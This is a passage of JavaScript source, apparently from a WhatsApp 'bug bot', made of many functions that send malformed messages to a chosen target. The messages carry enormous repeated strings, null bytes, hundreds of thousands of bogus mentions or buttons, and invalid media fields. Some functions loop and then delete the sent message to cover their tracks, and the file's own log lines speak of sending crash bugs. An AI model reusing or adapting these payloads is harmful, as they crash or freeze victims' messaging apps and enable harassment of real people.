                                    flow_cta: "ꦾ".repeat(10000),
                                    flow_message_version: "3"
                                })
                            }
                        ]
                    },
                    quotedMessage: {
                        interactiveResponseMessage: {
                            nativeFlowResponseMessage: {
                                version: 3,
                                name: "call_permission_request",
                                paramsJson: "\u0000".repeat(1045000)
                            },
                            body: {
                                text: "Ewe Bang Enak",
                                format: "DEFAULT"
                            }
                        }
                    }
                }
            }
        }
    });

    const msg = await generateWAMessageFromContent(target, otaxx, { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}
async function sendPaymentLinkStatus(otax, target) {
    while (true) {
        const payload = {
            extendedTextMessage: {
                text: "otax",
                description: " ayun<3 ",
                title: " is back?!! ",
                paymentLinkMetadata: {
                    button: { displayText: "@otax example" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(500000) },
                },
            },
        };

        const xnxxmsg = await generateWAMessageFromContent("status@broadcast", payload, {});

        if (!xnxxmsg?.message || !xnxxmsg?.key) return;

        await otax.relayMessage("status@broadcast", xnxxmsg.message, {
            messageId: xnxxmsg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        });
        await sleep(2000);
    }
}
async function SqLSpamGS(otax, target) {
    const payload = {
        extendedTextMessage: {
            text: "otax",
            description: " ayun<3 ",
            title: " is back?!! ",
            paymentLinkMetadata: {
                button: { displayText: "  @otax fucker" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(200000) },
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "  @xrelly fucker" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(200000) },
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221,
            },
        },
    };

    const groupPayload = {
        groupStatusMessageV2: {
            message: payload,
        },
    };

    const msg = generateWAMessageFromContent(target, groupPayload, {});

    await otax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
    });

    setTimeout(async () => {
        await otax.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: true,
                id: msg.key.id,
                participant: target
            }
        });
    }, 2000);
}
async function SqLSpam(otax, target) {
    const payload = {
        extendedTextMessage: {
            text: "otax",
            description: " ayun<3 ",
            title: " is back?!! ",
            paymentLinkMetadata: {
                button: { displayText: "  @otax fucker" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(200000) },
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "  @xrelly fucker" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(20000) },
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221,
            },
        },
    };

    const groupPayload = {
        groupStatusMessageV2: {
            message: payload,
        },
    };

    const msg = generateWAMessageFromContent(target, groupPayload, {});

    await otax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
    });
}
async function SqLGb(otax, target) {
    const payload = {
        extendedTextMessage: {
            text: "otax",
            description: " ayun<3 ",
            title: " is back?!! ",
            paymentLinkMetadata: {
                button: { displayText: "  @otax fucker" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(200000) },
            },
            linkPreviewMetadata: {
                paymentLinkMetadata: {
                    button: { displayText: "  @xrelly fucker" },
                    header: { headerType: 1 },
                    provider: { paramsJson: "{{".repeat(200000) },
                },
                urlMetadata: { fbExperimentId: 999 },
                fbExperimentId: 888,
                linkMediaDuration: 555,
                socialMediaPostType: 1221,
            },
        },
    };

    const groupPayload = {
        groupStatusMessageV2: {
            message: payload,
        },
    };

    const msg = generateWAMessageFromContent(target, groupPayload, {});

    await otax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        userJid: target,
    });
    await sleep(1000);

    await otax.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: msg.key.id,
        }
    })
}
async function SqLSpamXn(otax, target) {
    const extended = {
        text: "otax",
        description: " ayun<3 ",
        title: " is back?!! ",
        paymentLinkMetadata: {
            button: { displayText: "  @otax fucker" },
            header: { headerType: 1 },
            provider: { paramsJson: "{{".repeat(200000) },
        },
        linkPreviewMetadata: {
            paymentLinkMetadata: {
                button: { displayText: "  @xrelly fucker" },
                header: { headerType: 1 },
                provider: { paramsJson: "{{".repeat(200000) },
            },
            urlMetadata: { fbExperimentId: 999 },
            fbExperimentId: 888,
            linkMediaDuration: 555,
            socialMediaPostType: 1221,
        },
    };

    const payload = {
        extendedTextMessage: {
            ...extended,
            contextInfo: {
                quotedMessage: {
                    extendedTextMessage: { ...extended }
                }
            }
        },
    };

    const groupPayload = {
        groupStatusMessageV2: {
            message: payload,
        },
    };

    const msg = generateWAMessageFromContent(target, groupPayload, {});

    await otax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
    });
    await sleep(1000);
    await otax.sendMessage(target, { delete: msg.key });
}
async function homeBeta(otax, target) {
    const payload = {
        requestPaymentMessage: {
            currencyCodeIso4217: "MMK",
            amount1000: "999999",
            noteMessage: {
                extendedTextMessage: {
                    text: "otax",
                    description: " ayun<3 ",
                    title: " is back?!! ",
                    paymentLinkMetadata: {
                        button: {
                            displayText: "  @otax fucker",
                        },
                        header: {
                            headerType: 1,
                        },
                        provider: {
                            paramsJson: "{{".repeat(200000),
                        },
                    },
                    linkPreviewMetadata: {
                        paymentLinkMetadata: {
                            button: {
                                displayText: "@xrelly superiots",
                            },
                            header: {
                                headerType: 1,
                            },
                            provider: {
                                paramsJson: "{{".repeat(200000),
                            },
                        },
                        urlMetadata: {
                            fbExperimentId: 999,
                        },
                        fbExperimentId: 888,
                        linkMediaDuration: 555,
                        socialMediaPostType: 1221,
                    },
                },
            },
            expiryTimestamp: Date.now() + 86400000,
            background: null,
        },
    };

    const groupPayload = {
        groupStatusMessageV2: {
            message: payload,
        },
    };

    const msg = generateWAMessageFromContent(target, groupPayload, {});

    await otax.relayMessage(target, msg.message, {
        messageId: msg.key.id,
        participant: { jid: target },
        userJid: target,
    });
}
async function BugGbSange(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    const otaxx = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: -999.03499999999999,
                            degreesLongitude: 922.9999999999999,
                            name: "DO YOU KNOW ME?¿ otax" + "ꦽ".repeat(60000),
                            url: "https://t.me/Otapengenkawin",
                            contextInfo: {
                                externalAdReply: {
                                    quotedAd: {
                                        advertiserName: "ꦾ".repeat(60000),
                                        mediaType: "IMAGE",
                                        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                                        caption: "οταϰ ιѕ нєяє"
                                    },
                                    placeholderKey: {
                                        remoteJid: "0@g.us",
                                        fromMe: true,
                                        id: "ABCDEF1234567890"
                                    }
                                }
                            }
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "нαιι ιм οταϰ⸙"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{[",
                        messageVersion: 3,
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦽ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    "icon": "RIVIEW",
                                    "flow_cta": "ꦾ".repeat(10000),
                                    "flow_message_version": "3"
                                })
                            },
                        ]
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, proto.Message.fromObject(otaxx), { userJid: target });
    await otax.relayMessage(target, msg.message, { messageId: msg.key.id });
}

async function gsIntjavbkp(otax, target, otaxkiw = true) {
    for (let i = 0; i < 20; i++) {
        let otaxi = {
            interactiveResponseMessage: {
                contextInfo: {
                    mentionedJid: Array.from({ length: 2000 }, (_, i) => `628${i + 72}@s.whatsapp.net`),
                    isForwarded: true,
                    forwardingScore: 7205,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "12037205250208@newsletter",
                        newsletterName: "do u know me? | Information",
                        serverMessageId: 1000,
                        accessibilityText: "❖ 𝙁𝙪𝙘𝙠 𝙐 𝙈𝙚𝙣"
                    },
                    statusAttributionType: "RESHARED_FROM_MENTION",
                    contactVcard: true,
                    isSampled: true,
                    dissapearingMode: {
                        initiator: target,
                        initiatedByMe: true
                    },
                    expiration: Date.now()
                },
                body: {
                    text: "❖ 𝙄𝙢 𝙃𝙚𝙧𝙚 𝙊𝙏𝘼𝙓",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "address_message",
                    paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"otax?","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
                    version: 3
                }
            }
        }

        let msg = generateWAMessageFromContent(
            target,
            { groupStatusMessageV2: { message: otaxi } },
            {}
        )

        await otax.relayMessage(
            target,
            msg.message,
            otaxkiw
                ? { messageId: msg.key.id, participant: { jid: target }, userJid: target }
                : { messageId: msg.key.id }
        )

        await sleep(1000)

        await otax.sendMessage(target, {
            delete: {
                remoteJid: target,
                fromMe: true,
                id: msg.key.id,
                participant: target
            }
        })
    }
}
async function paySuck(otax, target) {
    await otax.relayMessage(target, {
        "interactiveMessage": {
            "nativeFlowMessage": {
                "buttons": [
                    {
                        "name": "payment_info",
                        "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"4UJPSC1FYKC\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"¿!deadcode!¿\",\"key\":\" 🪧" + "\u0000".repeat(902000) + "\",\"key_type\":\"CPF\"}}],\"share_payment_status\":false}"
                    }
                ]
            }
        }
    }, {});
}
async function ofmEr(otax, target) {
    let msg = await generateWAMessageFromContent(
        target,
        {
            botInvokeMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            fromMe: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "13135550202@bot",
                                botName: "Business Assistant",
                                creator: "XzC - Expos3d"
                            },
                            statusAttributionType: 2,
                            statusAttributions: Array.from({ length: 209000 }, (_, z) => ({
                                participant: `62${z + 720599}@s.whatsapp.net`,
                                type: 1
                            })),
                            participant: otax.user.id
                        },
                        body: {
                            text: "MANTA",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "{ X: { status:true } }",
                            version: 3
                        }
                    }
                }
            }
        },
        { statusJidList: [target] }
    );

    await otax.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg.message
        }
    }, {
        participant: { jid: target },
        messageId: msg.key.id
    });
    await sleep(1000);
    await otax.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: msg.key.id,
            participant: target
        }
    });
}

async function OfmSqLXnxx(otax, target) {
    let msg1 = await generateWAMessageFromContent(
        target,
        {
            botInvokeMessage: {
                message: {
                    interactiveResponseMessage: {
                        contextInfo: {
                            participant: target,
                            remoteJid: "Metallic4",
                            isForwarded: true,
                            forwardingScore: 999,
                            fromMe: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "13135550202@bot",
                                botName: "Business Assistant",
                                creator: "otax"
                            },
                            statusAttributionType: 4,
                            statusAttributions: Array.from({ length: 200000 }, () => ({
                                type: 1
                            }))
                        },
                        body: {
                            text: "MANTAX",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\u0000",
                            version: 3
                        }
                    }
                }
            }
        },
        { statusJidList: [target] }
    );

    await otax.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg1.message
        }
    }, {
        participant: { jid: target },
        messageId: msg1.key.id
    });
}

async function OfmSqLJav(otax, target) {
    let msg2 = await generateWAMessageFromContent(
        target,
        {
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 388944,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc",
                mediaKeyTimestamp: "1776937541",
                caption: "MANTAX CRASH V2",
                contextInfo: {
                    participant: target,
                    isForwarded: true,
                    forwardingScore: 999,
                    fromMe: true
                },
                annotations: Array.from({ length: 200000 }, () => ({
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            author: "MANTAX",
                            title: "Crash",
                        }
                    },
                    embeddedAction: true,
                }))
            }
        },
        { statusJidList: [target] }
    );

    await otax.relayMessage(target, {
        groupStatusMessageV2: {
            message: msg2.message
        }
    }, {
        participant: { jid: target },
        messageId: msg2.key.id
    });
    await sleep(1000);
    await otax.sendMessage(target, {
        delete: {
            remoteJid: target,
            fromMe: true,
            id: msg2.key.id,
            participant: target
        }
    });
}
async function palaLuMappimg(otax, target) {
    await otax.relayMessage("status@broadcast", {
        interactiveResponseMessage: {
            body: {
                text: " @null | Manta ¿? ",
                format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
                name: "call_permission_request",
                paramsJson: "{}",
                version: 3
            },
            contextInfo: {
                remoteJid: Math.random().toString(36) + " Tr4sh.corp¡! ",
                isForwarded: true,
                forwardingScore: 999,
                urlTrackingMap: {
                    urlTrackingMapElements: Array.from({ length: 50000 }, () => ({
                        "\u0000": "\u0000"
                    }))
                }
            }
        }
    }, {
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { status_setting: "contacts" },
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: []
                            }
                        ]
                    }
                ]
            }
        ]
    });
}
async function intImgBuffer(otax, target) {
    for (let x = 0; x < 5; x++) {
        await otax.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        header: {
                            hasMediaAttachment: true,
                            imageMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "image/jpeg",
                                fileSha256: "z8tbfc1DBcy9J0Gq7eJiu3ckMOyKKvbOs4Xl3J6UvGQ=",
                                fileLength: "1",
                                height: -212,
                                width: 999999999999,
                                mediaKey: "EiO5AfHhX1dTXqbBP5Wf/MzZ6qOqOG4nts9VrPv/rxY=",
                                fileEncSha256: "/PuWsqa9/5jDcRhuBexUEGjFN0wPHdXQPe/+SlSiwBU=",
                                directPath: "/v/t62.7118-24/541976809_2837142193286853_1911450611004796385_n.enc?ccb=11-4&oh=01_Q5Aa4gH0ixoCjpfiz1BLlSZACygYLxFcYUKiI4Nwq516e5pGvA&oe=6A29213C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1778501051",
                                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAC8ASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABQIEBgEDAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAABK0eKC9dyvDbCK+XhXZLYAcKosWaaBnLjFQVnGYcGrF4MKdzwIz8+nusagjXa2Jgx2H//EACcQAAICAgEDBAEFAAAAAAAAAAECAAMEERIFITEQExQgYSMyM0JR/9oACAEBAAE/AKLrFJPMynqFo8PKeqKR+pKsym3Wj9rem4tn9ADLujWps1NHD1rwdSCIDYSrpZxI8TH6haHSqzXKZGQ9YBXR3DdeD/IAZi3WWg8016tvideYUys3mjoAAezRum5SPEV0yC1ikHwJe9g/brUbOIdNrvRleUt4rNba03j0I2CJUxDsu+RWPchYAE/kCOeDoS25npz9rivcmZPvV8hxmwd78zBevHTuImWgQOXHGHwZ2cDiQCT3InAVAfnyYtVSncZQwjYd3MtsNL+m/I1pAhmTiXUaD+P9mSxGk36fHr2ddocYEd3YxMcaBbZP0dFcEMARM/pHLb0z/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
                                scansSidecar: "xt906ajMmv0EvBy89zTBKFs9rvAOwr8mIqV2kxGG6xUVyUSGmWzpuw=",
                                scanLengths: [
                                    999999999999,
                                    999999999999,
                                    999999999999,
                                    999999999999
                                ],
                                midQualityFileSha256: ""
                            }
                        },
                        body: {
                            text: "MantaX.exe"
                        },
                        contextInfo: {
                            remoteJid: "undefined@s.whatsapp.net",
                            mentionedJid: ["undefined@s.whatsapp.net"],
                            isForwarded: true,
                            forwardingScore: 9999,
                            parentGroupJid: "0@g.us"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            participant: {
                jid: target
            }
        });
    }
}

async function utgs(otax, target) {
    let msg = generateWAMessageFromContent(target, {
        interactiveResponseMessage: {
            body: {
                text: "Manta*X",
                format: 0
            },
            nativeFlowResponseMessage: {
                paramsJson: "{}",
                version: 3,
                name: "galaxy_message"
            }
        }
    }, {})

    msg.message.interactiveMessage.contextInfo = {
        statusAttributionType: "RESHARED_FROM_POST",
        urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 50000 }, () => ({
                "\0": "\0"
            }))
        }
    }
    msg.message.interactiveMessage.contextInfo = {
        quotedMessage: {
            interactiveResponseMessage: {
                nativeFlowResponseMessage: {
                    buttons: [
                        {
                            name: "galaxy_message",
                            buttonParamsJson: "{}"
                        }
                    ],
                    messageParamsJson: "{"
                },
                body: {
                    text: "\0".repeat(300000),
                    format: 0
                }
            }
        }
    }
    await otax.relayMessage(target, {
        groupStatusMessage: {
            message: msg.message
        }
    })
}
async function sendLoop(otax, target, ptcp = true) {

    const msg = generateWAMessageFromContent(
        target,
        {
            stickerMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
                fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                mimetype: "image/webp",
                directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                fileLength: "10610",
                mediaKeyTimestamp: "1775044724",
                stickerSentTs: "1775044724091",
            }
        },
        {}
    );


    await otax.relayMessage(
        target,
        {
            groupStatusMessageV2: {
                message: msg.message
            }
        },
        ptcp
            ? { messageId: msg.key.id, participant: { jid: target } }
            : { messageId: msg.key.id }
    );
    console.log(`MantaX Over You: ${target}`);

    await new Promise(r => setTimeout(r, 300));
}
async function nullAttack(otax, target) {
    const gerarJidAleatorio = () => {
        const ddis = ['41', '91', '90', '31', '40'];
        const ddiAleatorio = ddis[Math.floor(Math.random() * ddis.length)];
        return `${ddiAleatorio}${Math.floor(Math.random() * 1e10)
            .toString()
            .padStart(10, "0")}@s.whatsapp.net`;
    };

    const criarStatusAttributions = (limite) => {
        return Array.from({ length: limite }, () => ({
            participant: gerarJidAleatorio(),
            type: 1
        }));
    };
    try {
        await otax.relayMessage("status@broadcast", {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: "x",
                        listType: 1,
                        singleSelectReply: { selectedRowId: "id" },
                        description: "x",
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            fromMe: true,
                            isQuestion: true,
                            forwardedAiBotMessageInfo: {
                                botJid: "13135550202@bot",
                                botName: "Business Assistant",
                                creator: "lol"
                            },
                            statusAttributionType: 2,
                            statusAttributions: criarStatusAttributions(200000)
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        let locationMessage = {
            degreesLatitude: -9.09999,
            degreesLongitude: 199.99963,
            name: "X" + "𖣂".repeat(15000),
            address: "X" + "𖣂".repeat(5000),
            url: `https://api.${"𖣂".repeat(25000)}.com`
        };

        let msg = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: { locationMessage } }
        }, {});

        await otax.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        let extendMsg = {
            extendedTextMessage: {
                text: "OTAX X MANTA",
                matchedText: "https://t.me/Otapengenkawin",
                description: "manta X - 1945".repeat(15000),
                title: "— Manta".repeat(15000),
                previewType: "NONE"
            }
        };

        let msg2 = generateWAMessageFromContent(target, {
            viewOnceMessage: { message: extendMsg }
        }, {});

        await otax.relayMessage("status@broadcast", msg2.message, {
            messageId: msg2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target }
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        console.log("Send to:", target);
        await new Promise(r => setTimeout(r, 2000));

    } catch (e) {
        console.error("error:", e);
    }
}
async function dickg(otax, target) {
    const jidinMemek = () => {
        const ddis = ['41', '91', '90', '31', '40'];
        const ddiAleatorio = ddis[Math.floor(Math.random() * ddis.length)];
        return `${ddiAleatorio}${Math.floor(Math.random() * 1e10).toString().padStart(10, "0")}@s.whatsapp.net`;
    };

    const yatimStatusAtribut = (limite) => {
        const lista = [];
        for (let i = 0; i < limite; i++) {
            lista.push({
                participant: jidinMemek(),
                type: 1
            });
        }
        return lista;
    };

    await otax.relayMessage(
        "status@broadcast",
        {
            ptvMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/569084289_4410558982514927_5233290163373958484_n.enc?ccb=11-4&oh=01_Q5Aa4QGqUuwgLOpfHh6KOt7-LElfEA74xKDlN9zPkFH49fBdBA&oe=6A04A0D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "l070UkHtPVphO/Hq1vOA5ama8KccnrT8M/l31h49GAE=",
                fileLength: "587266",
                seconds: 6,
                mediaKey: "GUJVRvFuWcbjjxp/qG8Pz7+HMLuCWQGoSeQOmIC/b2U=",
                height: -480,
                width: 480,
                fileEncSha256: "tyoLSB0XOOabzg9MxXgrlNr/t3E6wNuB4FzFe+EEd/I=",
                directPath: "/v/t62.7161-24/569084289_4410558982514927_5233290163373958484_n.enc?ccb=11-4&oh=01_Q5Aa4QGqUuwgLOpfHh6KOt7-LElfEA74xKDlN9zPkFH49fBdBA&oe=6A04A0D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1776106399",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAAABAIDBQYBAQEBAQEAAAAAAAAAAAAAAAABAAID/9oADAMBAAIQAxAAAADmWZ7w16EbRzK5FK5fQTrlho1noy1bGnbl7GXXeTCZnaM0DpokpoJZb7pWNVUwvBC+iYFJTF/Ia9b81Z5SHlFShGsc8zTphdsE3nQxuMQyoYgbwuBo/8QAKBAAAgICAQMDAwUAAAAAAAAAAQIAAwQRMRIhQRMiUQUQYRQjJDI0/9oACAEBAAE/AJRjWXntx8zHwqavGzAI2YQWAXuDDmvx0S2pbxv0wGltFlfcjt8/bDxWybNeBzK61rAVR2EUTUNSi7v5MvprA2DMX0wd7JiVpZW6kbBJmVjmiwjx4n02kVYJPDGIdkxYIaVY9fkRk2QW8T1aU7AiY3esn8zOo9ak/ImLZ/FIeD2ncRtxXIBLcbid1OvmZFTa2TGpYDjzMQfsxpjoP07HUK+2VqelSQIa1I1qBNDQEDdbOuuDGrB5EA9P2qIzNKP8rSv3MBPTCjtB0/MZgOwMRQjuxY+6eok6lBJ3HtQNPpl9dmHo8jmK+IDsDUFtLdgZtCOwjt3A6YSQJsnmGZlnQJi5L47kjg8iV2K4BBlfQVr7d5vUsJJ4hyE/MD8yyxUUsxmRcbrCfH2xct8Z+AV8iL9SptIKjRA4is5rHthLfHiV76f6TJy6qmPzL8l7j34+3//EABoRAQACAwEAAAAAAAAAAAAAAAEAEAIgIRH/2gAIAQIBAT8AWx0YacnKZ7YVkUAV/8QAGBEBAQADAAAAAAAAAAAAAAAAARAAETD/2gAIAQMBAT8Ar0M1VgxZ/9k=",
                streamingSidecar: "wIDBQt5AUU9QjaifWgd0nVICmBwBgqFa7n7iIjlfsXENh1+W4EO0kJjFtzlYVo179+UizTn4yS6mjEs9o8dLGlPr6CdbYoWfnbLrun1aslITgOw2bibpfa61",

                contextInfo: {
                    remoteJid: " dnd :) ",
                    mentionedJid: ["status@broadcast"],
                    fromMe: true,
                    statusAttributionType: 2,
                    statusAttributions: yatimStatusAtribut(200000),
                    isForwarded: true,
                    forwardingScore: 9999,
                },
            },
        },
        {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { status_setting: "contacts" },
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: [],
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
}
async function CarouselOtax(otax, target) {
    console.log(chalk.red(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "OTAX" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "OTAX" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            imageMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                fileLength: 388944,
                height: 1600,
                width: 1200,
                mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
